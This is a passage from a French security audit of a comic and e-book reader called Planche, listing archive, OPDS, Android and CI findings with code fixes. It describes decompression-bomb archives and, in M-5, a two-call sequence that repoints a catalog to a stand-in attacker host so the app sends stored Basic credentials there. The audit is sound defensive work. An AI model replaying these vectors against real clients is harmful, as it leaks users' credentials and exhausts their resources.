- **Vecteur** : un `.cb7` solide de quelques Mio dont la première entrée (`0.bin`, 32 Gio de zéros) précède `001.jpg` fait allouer 32 Gio au worker dès le scan ; un `.cb7`/`.cbr` solide déclarant des centaines de Gio sous des noms non-image occupe un cœur pendant des heures à l'ouverture. Non persistant seulement une fois H-1 corrigé.
- **Correctif** — `book.rs` :
```rust
pub const MAX_EXTRACT_BYTES: u64 = 8 * 1024 * 1024 * 1024;   // devient pub
impl Extractor<'_> {
    /// Accounts for an entry that is not written but has to be decoded all the
    /// same: a solid stream is decoded through skipped entries.
    fn skip(&mut self, size: u64) -> Result<()> {
        self.total += size;
        if self.total > MAX_EXTRACT_BYTES {
            bail!("archive too large once decompressed");
        }
        Ok(())
    }
}
// extract_rar : après open_for_processing()
    let solid = archive.is_solid();
// … entre `let target = …;` et `archive = match target {` :
        if solid && target.is_none() {
            sink.skip(entry.unpacked_size)?;
        }
// extract_7z : piloter ArchiveReader directement (plus de safe_join de la bibliothèque)
fn extract_7z(path: &Path, sink: &mut Extractor) -> Result<()> {
    let mut reader = sevenz_rust2::ArchiveReader::new(storage::open(path)?, sevenz_rust2::Password::empty())
        .map_err(|e| anyhow!("7z: {e}"))?;
    let solid = reader.archive().is_solid;
    let mut count = 0;
    let mut failure: Option<anyhow::Error> = None;
    reader
        .for_each_entries(|entry, data| {
            if failure.is_some() {
                return Ok(false);
            }
            count += 1;
            let step = (|| -> Result<()> {
                if count > MAX_ENTRIES {
                    bail!("too many entries");
                }
                match (!entry.is_directory()).then(|| sink.accept(entry.name(), entry.size())).transpose()?.flatten() {
                    Some(target) => sink.write(&target, data),
                    // A solid stream has to be decoded through skipped entries to
                    // stay aligned, which costs their declared size; other archives
                    // seek to the next block for free.
                    None if solid => {
                        sink.skip(entry.size())?;
                        std::io::copy(data, &mut std::io::sink())?;
                        Ok(())
                    }
                    None => Ok(()),
                }
            })();
            match step {
                Ok(()) => Ok(true),
                Err(e) => {
                    failure = Some(e);
                    Ok(false)
                }
            }
        })
        .map_err(|e| anyhow!("7z: {e}"))?;
    failure.map_or(Ok(()), Err)
}

/// Bytes of the entry `name`, within MAX_ENTRY_BYTES. In a solid archive
/// `ArchiveReader::read_file` would read every entry stored before it into
/// memory: those are decoded into a sink instead, within the extraction budget.
pub fn read_7z_entry(reader: &mut sevenz_rust2::ArchiveReader<File>, name: &str) -> Result<Vec<u8>> {
    let size = reader.archive().files.iter().find(|f| f.name() == name).map_or(0, |f| f.size());
    if size > MAX_ENTRY_BYTES {
        bail!("page too large");
    }
    if !reader.archive().is_solid {
        return reader.read_file(name).map_err(|e| anyhow!("7z: {e}"));
    }
    let (mut found, mut drained, mut failure) = (None, 0u64, None);
    reader
        .for_each_entries(|entry, data| {
            if entry.name() == name {
                let mut bytes = Vec::with_capacity(size.min(PREALLOC_BYTES) as usize);
                data.take(MAX_ENTRY_BYTES + 1).read_to_end(&mut bytes)?;
                found = Some(bytes);
                return Ok(false);
            }
            drained += entry.size();
            if drained > MAX_EXTRACT_BYTES {
                failure = Some(anyhow!("archive too large once decompressed"));
                return Ok(false);
            }
            std::io::copy(data, &mut std::io::sink())?;
            Ok(true)
        })
        .map_err(|e| anyhow!("7z: {e}"))?;
    match (failure, found) {
        (Some(e), _) => Err(e),
        (None, Some(bytes)) => Ok(bytes),
        (None, None) => bail!("7z: entry not found"),
    }
}
```
`thumbs.rs` : remplacer le test de taille + `reader.read_file(&first)` par `let bytes = book::read_7z_entry(&mut reader, &first)?;` ; `meta.rs:77` : `Some(n) => Some(String::from_utf8_lossy(&book::read_7z_entry(&mut reader, &n)?).into_owned())`. Même budget cumulé (`drained += unpacked_size` si `archive.is_solid()`) dans les boucles `header.skip()` de `thumbs.rs` et `meta.rs` pour le RAR.

### 5.6 M-5 — `opds_save` déplace l'origine d'un catalogue en gardant son mot de passe
- **Localisation** : `lib.rs` `opds_save` (transmet id/name/url/username/password tels quels) ; `opds.rs:144-150` (branche `UPDATE … SET url = ?3` sans comparer l'origine) et `151-155` (`None => {}` conserve le secret) ; `opds.rs:185-191` (`request` compare l'URL demandée à `catalog.url`, c'est-à-dire à la valeur **courante** en base).
- **Vecteur** (après injection de script, bloquée aujourd'hui par la CSP) : `opds_save(id, name, url = "https://attaquant", username, password = null)` puis `opds_fetch(id, "https://attaquant/…")` → le moteur (hors de portée de la CSP) envoie `Authorization: Basic user:motdepasse`. Deux appels, sans interaction, pour **tous** les catalogues (identifiants Komga/Kavita/Calibre-web réutilisables hors de Planche).
- **Correctif** — `opds.rs`, `use rusqlite::{params, Connection, OptionalExtension};`, branche de mise à jour de `save` :
```rust
    } else {
        // Credentials are bound to the origin they were entered for: a catalog
        // moved to another server loses its stored password unless a new one
        // comes with the change (the page could otherwise point a catalog at a
        // host of its choice and have `fetch` send the password there).
        let previous: Option<String> =
            conn.query_row("SELECT url FROM opds_catalogs WHERE id = ?1", [id], |r| r.get(0)).optional()?;
        let Some(previous) = previous else { bail!("catalog not found") };
        let moved = check_url(&previous).map(|p| p.origin() != url.origin()).unwrap_or(true);
        conn.execute(
            "UPDATE opds_catalogs SET name = ?2, url = ?3, username = ?4 WHERE id = ?1",
            params![id, name.trim(), url.as_str(), username],
        )?;
        if moved {
            secret::delete(conn, id);   // the new password, if any, is set by the match below
        }
        id.to_owned()
    };
```
Interface (`Catalogs.tsx`, `CatalogDialog`) : détecter le changement d'origine (`new URL(url).origin !== new URL(catalog.url).origin`, dans un `try`) et, si `catalog.has_password && !password`, refuser la validation avec un message `opds.passwordAgain` (« Nouvelle adresse : saisissez à nouveau le mot de passe… ») — sans quoi le bouton « Tester » effacerait le secret avant le test. Effet bienvenu : un id inconnu renvoie une erreur au lieu de créer une entrée orpheline dans le coffre (F-13). Optionnel, strict : n'envoyer le `Basic` que si `password.is_some()`.

### 5.7 Faibles — SQLite et coffre (F-1 à F-6)
- **F-1** `db.rs` `init` : ajouter `PRAGMA temp_store = MEMORY;` en tête du lot (test : `PRAGMA temp_store` = 2).
- **F-2** `opds.rs` `check_url` : refuser l'userinfo (`if !url.username().is_empty() || url.password().is_some() { bail!("identifiants dans l'adresse : utilisez les champs Identifiant et Mot de passe") }`) ; dans `request`, retirer userinfo des liens de flux (`url.set_username("")`, `url.set_password(None)`) pour qu'un flux ne fasse jamais envoyer un `Authorization` de son choix.
- **F-3** `vault.rs` `Vault::open` : si la clé du coffre n'ouvre pas un instantané existant et qu'un fichier de clé différent existe, essayer celui-ci puis le promouvoir dans le coffre (`entry.set_password(&to_hex(&alt))`, `erase(&key_file)`).
- **F-4** `persist()` émet `save-failed` vers la page (`AppState.handle: AppHandle`), affiché par `App.tsx` (`errors.saveFailed` dans les 27 locales) ; en cas de refus du dialogue de récupération, afficher aussi la raison avant de quitter.
- **F-5** Passer les 24 commandes synchrones touchant la base en `#[tauri::command(async)]` (`State<'_, Arc<AppState>>` comme `add_root`) ; sortir chiffrement et E/S du verrou dans `Vault::save` (sérialiser sous le verrou, chiffrer/écrire après, un seul écrivain à la fois).
- **F-6** `lib.rs` : `pub(crate) fn opening_lock(&self, id)`, pris aussi par le worker (`thumbs.rs`, branche `real =>`) ; dans `opened`, retirer l'entrée quand `Arc::strong_count(&lock) <= 2` après usage.

### 5.8 Faibles — parsing et rendu (F-7 à F-10)
- **F-7** `src/opds.ts` : `str()` déclaré avant `names()` ; `names` normalise `.name` via `str` ; `title: str(f.metadata?.title)` (titre du flux) ; `title: str(n.title) || str(n.href)` ; `hasDoctype(xml)` (parcours linéaire du prologue : espaces, `<?…?>`, `<!--…-->`, puis test `<!DOCTYPE`) → `throw new Error("invalid feed")` avant `DOMParser`, et `parsererror` testé aussi pour OpenSearch ; `decodeURI` dans un `try` (repli sur la chaîne brute) ; plafonner les entrées rendues (`MAX_ENTRIES = 2000`, puis pagination).
- **F-8** `book.rs` `epub_spine_images` : `MAX_SPINE_DOCS = 5_000`, `MAX_SPINE_BYTES = 64 Mio`, un document lu une seule fois quel que soit le nombre de répétitions de l'`idref`, regex compilées une fois. EPUB texte : `check_text_epub(zip)` avant `TEXT_EPUB` (≤ 5 000 entrées, ≤ 1 Gio déclaré via `by_index_raw`, sans inflation). `TextReader.tsx` : normaliser le sommaire (`href: typeof i.href === "string" ? i.href : ""`) et envelopper `BookView` dans `ErrorBoundary` (`App.tsx`). `tts.ts` : `new Intl.Segmenter(lang, …)` dans un `try` avec repli sur `"fr"` puis sur la découpe par ponctuation.
- **F-9** `TextReader.tsx` : (1) hook `b.spine.hooks.content` sur le document **inerte** (avant sérialisation) : retirer `script, iframe, frame, object, embed, applet, form`, `meta[http-equiv]`, `base`, `link[rel~="preconnect|dns-prefetch|prefetch|prerender"]` ; (2) au rendu, décider par l'analyseur d'URL et non par regex : `const u = new URL(href, contents.document.baseURI)` et neutraliser tout `a, area` (y compris `xlink:href`, `getAttributeNS`) dont `u.protocol + "//" + u.host` diffère de celui du document ; (3) retransmission clavier : ignorer les touches dont la cible est `input`, `textarea`, `select` ou `isContentEditable` (test par `localName`, `instanceof` ne traverse pas les realms).
- **F-10** `src/pdf.ts` : créer le worker depuis un `blob:` de même origine (`fetch(workerUrl).then(r => r.text())` → `URL.createObjectURL(new Blob([src], { type: "text/javascript" }))`) : il hérite alors de la CSP de la page ; `worker-src 'self' blob:` l'autorise déjà.

### 5.9 Faibles — fichiers (F-11 à F-13)
- **F-11** `opds.rs` `download` : isoler la boucle dans un bloc `async` dont le résultat est examiné après `drop(file)` ; sur `Err`, `remove_file(&partial)` ; réserver le nom final dans un `static IN_FLIGHT: LazyLock<Mutex<HashSet<PathBuf>>>` (libéré en fin, y compris par `Drop`) pour qu'un second téléchargement du même titre ne puisse pas être écrasé par `rename`.
- **F-12** `book.rs` `safe_relative` : ignorer (renvoyer `None`, donc sauter l'entrée) les composants se terminant par un point ou une espace, contenant `<>"|?*`, ou dont le radical est un nom réservé Windows (partager `RESERVED_NAMES` de `opds.rs` en `pub(crate)`) ; dans `Extractor::write`, drainer `data` quand la cible est ignorée pour garder l'alignement des flux solides.
- **F-13** `save_thumbnail` : exiger un livre existant **de type `pdf`** (`db::book(...).is_some_and(|b| b.kind == "pdf")`) ; `export_annotations` : `path.set_extension(if is_json { "json" } else { "md" })` et `default_name` réduit à `Path::new(&default_name).file_name()` ; `set_settings` : `MAX_SETTINGS_BYTES = 1 Mio`.

### 5.10 Faibles — Tauri (F-14)
- Réponses `planche://` : ajouter `Content-Security-Policy: default-src 'none'; sandbox` dans les deux branches du `Response::builder()` (une réponse naviguée par erreur n'exécute rien et reçoit une origine opaque) ; filtre des couvertures : `v.starts_with("image/") && v != "image/svg+xml"` (test `only_image_types_pass_for_covers` à compléter : `pick("image/svg+xml") == "application/octet-stream"`).
- `opener` : remplacer l'appel direct par une commande par id — `reveal_book(id)` (`app.opener().reveal_item_in_dir(path)` avec le chemin lu en base), retirer `opener:allow-reveal-item-in-dir` de `capabilities/default.json` et `@tauri-apps/plugin-opener` du front (`api.revealBook(book.id)` dans `Reader.tsx`).

### 5.11 Faibles — Android (F-15)
- `storage.rs` `query` : avant `close`, `if env.exception_check().unwrap_or(false) { let _ = env.exception_describe(); let _ = env.exception_clear(); }` (une exception pendante fait échouer tout appel JNI suivant, `close` compris).
- `StoragePlugin.kt` : `try/catch` dans `folderPicked`, `filePicked` et `picked()` (`contentResolver.query` relaie les `RuntimeException` d'un `DocumentsProvider` tiers) ; drapeau `pickerOpen` (`invoke.reject("busy")`) posé **après** un `startActivityForResult` réussi et remis à faux dans tous les chemins ; `releaseAccess(path)` appelé par `remove_root` pour `releasePersistableUriPermission` (sur l'URI d'arbre : `buildTreeDocumentUri(authority, getTreeDocumentId(uri))`).
- `AndroidManifest.xml` : `android:dataExtractionRules="@xml/data_extraction_rules"` (nouveau fichier excluant `library.key`, `library.planche`, `library.planche.bak` en `cloud-backup` **et** `device-transfer`), en gardant `allowBackup="false"`.
- `res/xml/file_paths.xml` : remplacer `<external-path path="."/>` et `<cache-path path="."/>` par `<external-files-path name="my_images" path="Pictures/" />` (seul usage : capture photo du WebChromeClient).
- `lib.rs` `add_root` : comparer les URIs SAF par `(authority, id décodé)` (`content://<auth>/tree/<t>/document/<id>` ; `primary:Comics/Sub` est dans `primary:Comics`) au lieu de `canonicalize`/`starts_with`.
- `vault.rs` : copier la clé héritée (`write_key_file` + `erase(&old)`) au lieu de `fs::rename` (échoue entre volumes, profil itinérant).

### 5.12 Faibles — CI, chaîne d'approvisionnement, divers (F-16, F-17)
- `android.yml` : `gradle/actions/wrapper-validation@0723195856401067f7a2779048b490ace7a47d7c # v5.0.2` juste après `checkout`, avant d'écrire la clé ; `gradle-wrapper.properties` : `distributionSha256Sum=` (valeur publiée par Gradle pour la distribution utilisée).
- `audit.yml` : `cargo install cargo-audit@0.22.2 --locked` (version exacte) ; garde « UnRAR vendorisé à jour » comparant `vendor/UNRAR_VERSION` au tarball publié sur rar_add.htm, en **avertissement** (pas d'échec si rarlab.com est injoignable).
- `npm ci --ignore-scripts` dans les trois workflows de compilation (les deux `postinstall` bloqués en local — `core-js`, `es5-ext`, tirés par epubjs et jamais exécutés par le bundle — s'exécutent sur les runners avec npm 10).
- `dependabot.yml` : écosystème `gradle` (`directories: ["/planche/src-tauri/gen/android", "/planche/src-tauri/plugins/planche-storage/android"]`, hebdomadaire) ; `cooldown: { default-days: 7, semver-patch-days: 3 }` sur npm et cargo.
- `lib.rs` : `std::env::args_os().map(|a| a.to_string_lossy().into_owned())` (un argument non Unicode fait aujourd'hui paniquer `env::args()` → abort avant la fenêtre) ; sous Unix, créer `data`, `cache` et `thumbnails` en `0o700` (`DirBuilder::mode`) et `set_permissions(0o700)` pour les installations existantes.

### 5.13 Informations (I-1)
- `release.yml` : le secret Partner Center reste un argument du processus `msstore` (lisible par tout code du même job) ; corriger le commentaire ; alternative sans secret : `--clientAssertion` + `MSSTORE_CLIENT_ASSERTION` (identité fédérée GitHub OIDC, msstore-cli ≥ 0.4.2).
- `.gitignore` : ajouter `.env`, `.env.*`, `*.p12`, `*.pfx`, `*.pem`, `*service-account*.json`.
- Android : tao émet `RunEvent::Opened` pour `VIEW`/`SEND`, `lib.rs` ne le traite que sous macOS/iOS ; si la prise en charge est souhaitée, n'accepter que `content://` (`state.allow(&path)` puis `open-file`), jamais `file://`.
- Releases : `sha256sum` des paquets (`SHA256SUMS`) et `actions/attest-build-provenance` (épinglé, `id-token: write` + `attestations: write` sur le seul job `publish`) ; documenter la vérification dans `SECURITY.md`.
- `open_with_other_app` : `Command::new(Path::new(&env::var_os("SystemRoot")…).join("System32").join("rundll32.exe"))` supprime toute dépendance à la résolution de `std`.
- `vendor/README.md` / `upgrade.sh` : remplacer par la procédure §5.3 ; PR amont muja/unrar.rs avec le `build.rs` vendorisé (`CARGO_CFG_TARGET_OS`, `c++_static`/`c++abi` Android) pour supprimer un jour `[patch.crates-io]`.

## 6. Points vérifiés et jugés sains (synthèse)

Au-delà des sections 2 à 4 : CSP de production stricte et cohérente ; cadre EPUB sans scripts ni popups ; `sanitizeBookHtml` sans contournement ; routes `raw`/`page` du protocole dérivées d'une clé SQL, jamais de l'URL ; liste blanche des chemins (`take_allowed`) à usage unique, alimentée uniquement par le moteur ; `valid_id` sur les vignettes ; extraction bornée (256 Mio/fichier, 8 Gio/archive, 100 000 entrées) et sans écriture par les bibliothèques ; identifiants OPDS hors base sur bureau, `#[serde(skip)]`, retirés par reqwest sur redirection, TLS vérifié partout (aucun `danger_accept_invalid_*`) ; `body_limited` correct (longueur annoncée puis octets reçus) ; coffre : nonce aléatoire par écriture, AAD versionnée, `create_new` sur le fichier de clé, migration de l'ancienne base par réécriture de zéros ; workflows sans `pull_request_target`, secrets hors forks, actions épinglées, aucune clé dans les artefacts ; `vite.config.ts` (serveur de dev local), `build.rs`, `planche.desktop` (`%F`), `AppxManifest.xml` (`internetClient`, `runFullTrust`), `crop.ts`, `settings.ts` (fusion sans pollution de prototype), `shortcuts.ts` relus sans constat ; aucun `new RegExp` sur donnée, aucun objet indexé par un nom de série (`Map` partout).

## 7. Constat rejeté et limites

- **Rejeté (0/3)** : « `folderLabel` appelle `decodeURIComponent` sans garde sur un chemin `content://` persistant → `URIError` à chaque rendu ». Le code est exact (`Library.tsx:108-112`) mais le déclencheur est inatteignable : les URIs viennent du sélecteur SAF et sont toujours correctement encodées.
- **Non vérifié hors ligne** : le comportement de WebKitGTK face à `frame-src` pour une navigation déclenchée depuis le cadre sandboxé sans script (`meta refresh`, lien SVG) — le correctif F-9 (retrait de ces éléments avant rendu) rend la question sans objet ; la règle Android « `allowBackup=false` n'exclut pas le transfert d'appareil » (F-15) — le correctif `dataExtractionRules` est inoffensif quel que soit le verdict.
- Vérifié par le critique : sous Linux/macOS le dépôt (glisser-déposer) d'une URL texte sur la fenêtre est bien bloqué par tauri-runtime-wry (le gestionnaire renvoie toujours `true`).

## 8. Ordre d'application recommandé

1. **H-1** (fichier témoin) — rend non persistants tous les plantages de décodeur ; puis **M-2 immédiat** (listage RAR en mode extraction) et **M-3** (codes inconnus, dictionnaire).
2. **M-4** (`skip` comptabilisé, `read_7z_entry`) et **M-1** (délais, deux sémaphores) avec **F-11**.
3. **M-5** (identifiants liés à l'origine) et **F-2**.
4. Mise à jour **UnRAR 7.3.2** (M-2 de fond), avec la garde CI et la procédure documentée.
5. Faibles par fichier : `opds.ts` (F-7), `book.rs` (F-8, F-12), `TextReader.tsx` (F-8, F-9), `lib.rs` (F-5, F-6, F-13, F-14, F-17), Android (F-15), CI (F-16).
